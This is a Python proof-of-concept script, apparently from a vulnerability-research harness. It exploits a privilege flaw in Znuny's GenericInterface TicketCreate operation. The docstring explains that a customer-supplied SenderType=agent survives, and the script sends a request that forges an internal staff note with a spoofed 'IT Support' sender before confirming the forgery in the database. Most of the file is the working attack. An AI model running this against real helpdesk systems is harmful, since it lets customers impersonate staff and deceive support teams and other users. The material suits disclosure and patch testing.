#!/usr/bin/env python3
r"""
VULN-008 — GenericInterface customer channel divergence: forge agent/internal articles
=======================================================================================
Vulnerable code : targets/Znuny/Kernel/GenericInterface/Operation/Ticket/TicketCreate.pm:553-554,1716-1718
                  neutralised guard: CustomerPermission/CustomerUserIDCheck.pm (Granted=1, type-blind),
                  GroupCheck.pm (all-groups under default CustomerGroupSupport=0)
Vulnerability   : CWE-269/CWE-639 privilege / mass-assignment across the customer↔agent boundary

Flaw
----
The GI TicketCreate operation only *defaults* the article SenderType when the caller omits it:

    553:  if ( !$Article->{SenderTypeID} && !$Article->{SenderType} ) {
    554:      $Article->{SenderType} = $UserType eq 'User' ? 'agent' : 'customer';
    ...
    1716: SenderType          => $Article->{SenderType},
    1717: IsVisibleForCustomer=> $Article->{IsVisibleForCustomer},

A customer-authenticated caller who *supplies* `SenderType=agent` (and `IsVisibleForCustomer=0`)
keeps those values — creating an article that renders as an internal staff note, plus assigning
Owner/State/Priority/Queue the customer UI never exposes. The per-field customer permission
check that the CVE-2025-26846 fix added is a no-op here: `CustomerUserIDCheck` (registered
Granted=1) returns true on ticket ownership ignoring Type, and `GroupCheck` collapses to
"all groups" under the shipped default `CustomerGroupSupport=0`.

A successful run: a *customer* creates a ticket whose article is stored SenderType=agent,
IsVisibleForCustomer=0, with a spoofed From — in-portal staff impersonation.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-008", "GI customer forges agent/internal article (TicketCreate)",
             ["TicketCreate.pm:553 only DEFAULTS SenderType — a supplied SenderType=agent survives",
              "customer per-field check neutralised (CustomerUserIDCheck Granted=1 + CustomerGroupSupport=0)"])

    sfx = C.rid()
    ws_name, ws = C.ensure_webservice()
    C.log("SETUP", f"imported web service {ws_name} (shipped GenericTicketConnectorREST example)")
    cu, cp, cid = C.create_customer(login=f"cust008_{sfx}", customer_id=f"cust008_{sfx}")
    C.log("SETUP", f"created customer {cu} (cid={cid}) — a plain, unprivileged portal account")

    spoof_from = "IT Support <helpdesk@corp.example>"
    body = {
        "CustomerUserLogin": cu, "Password": cp,
        "Ticket": {"Title": f"Refund {sfx}", "Queue": "Raw", "State": "new",
                   "Priority": "3 normal", "CustomerUser": cu},
        # SenderType=agent + IsVisibleForCustomer=0 are the forged fields the UI never allows.
        "Article": {"Subject": "Refund approved by staff", "Body": "Your refund was approved.",
                    "SenderType": "agent", "IsVisibleForCustomer": 0, "From": spoof_from,
                    "ContentType": "text/plain; charset=utf8"},
    }
    C.log("STEP", "POST /Ticket as CUSTOMER with Article.SenderType=agent, IsVisibleForCustomer=0, spoofed From")
    st, resp = C.gi_post(ws, "/Ticket", body)
    C.log("PROOF", f"HTTP {st} -> {str(resp)[:160]}")
    open(os.path.join(HERE, "request.http"), "w").write(
        f"POST /znuny/nph-genericinterface.pl/Webservice/{ws_name}/Ticket HTTP/1.1\r\n"
        f"Content-Type: application/json\r\n\r\n{C.json.dumps(body)}\r\n")
    open(os.path.join(HERE, "response.txt"), "w").write(str(resp))

    if not (isinstance(resp, dict) and resp.get("TicketID")):
        C.failed(f"TicketCreate did not succeed: {resp}")
    tid = resp["TicketID"]

    # Verify at the DB the stored article really is an internal AGENT-sender note.
    rows = C.db("SELECT st.name, a.is_visible_for_customer, amd.a_from "
                "FROM article a JOIN article_sender_type st ON st.id=a.article_sender_type_id "
                "JOIN article_data_mime amd ON amd.article_id=a.id "
                f"WHERE a.ticket_id={int(tid)} ORDER BY a.id DESC LIMIT 1")
    C.log("PROOF", f"stored article (DB): sender_type={rows and rows[0][0]}, "
                   f"is_visible_for_customer={rows and rows[0][1]}, from={rows and rows[0][2]!r}")

    if rows and rows[0][0] == "agent" and rows[0][1] == "0" and "helpdesk@corp.example" in (rows[0][2] or ""):
        C.confirmed(f"customer {cu} created ticket {tid} whose article is stored SenderType=agent, "
                    "IsVisibleForCustomer=0, From spoofed to 'IT Support' — a forged internal "
                    "staff note the customer UI can never produce (BFLA/mass-assignment).")
    else:
        C.failed(f"article not forged as agent/internal: {rows}")

if __name__ == "__main__":
    main()
